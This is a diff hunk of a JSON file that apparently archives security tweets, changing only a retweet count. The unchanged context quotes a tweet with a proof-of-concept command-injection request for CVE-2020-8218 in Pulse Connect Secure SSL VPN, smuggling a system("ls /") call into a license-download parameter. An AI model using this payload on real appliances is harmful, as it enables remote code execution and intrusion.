@@ -466,7 +466,7 @@
     "tweetfavorites": 299,
     "tweetquotes": 3,
     "tweetreplies": 1,
-    "tweetretweets": 128,
+    "tweetretweets": 127,
     "tweettext": "RCE in Pulse Connect Secure SSL VPN (CVE-2020-8218) \n\n[Proof Of Concept]\n/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever -n '($x=\"ls /\",system$x); #' -e /data/runtime/tmp/tt/setcookie.thtml.ttc\n\nhttps://t.co/XhlYdrrWqB https://t.co/C4mjbngIq0",
     "tweettime": "2020-09-02, 04:57:25",
     "tweeturl": "https://twitter.com/wugeej/status/1301021388455596032",
